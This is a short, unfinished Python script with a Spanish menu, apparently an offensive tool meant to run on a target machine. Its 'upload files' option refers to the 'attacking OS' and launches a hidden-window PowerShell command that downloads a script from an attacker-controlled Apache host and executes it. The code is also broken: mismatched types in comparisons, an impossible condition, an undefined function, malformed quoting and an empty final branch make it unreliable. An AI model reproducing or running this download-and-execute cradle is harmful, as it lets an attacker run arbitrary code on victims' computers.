import os

comando = input("""
       Escoja una opcion ...

       1: view ip
       2: upload files
       3:
       4:
       5:
       
       >>  """)

if comando ==1:
  os.system('ipconfig')

if comando == 2:
  print("Para transferir archivos debe abrir admin_transfer.py en el OS atacante. comand = <python3 admin_transfer.py>")
  question = input("Cuando haya realizado la tarea necesaria escriba [Y] or [y] para continuar.")
  if question=="y" and question=="Y":   
       clearScr()
       os.system('powershell -noexit -windowstyle hidden -c IEX(New-Object System.Net.WebClient).DownloadString(\'http://"+ apache_ip +"/*\'))
       

      
if comando == 3:
      
      
      
      
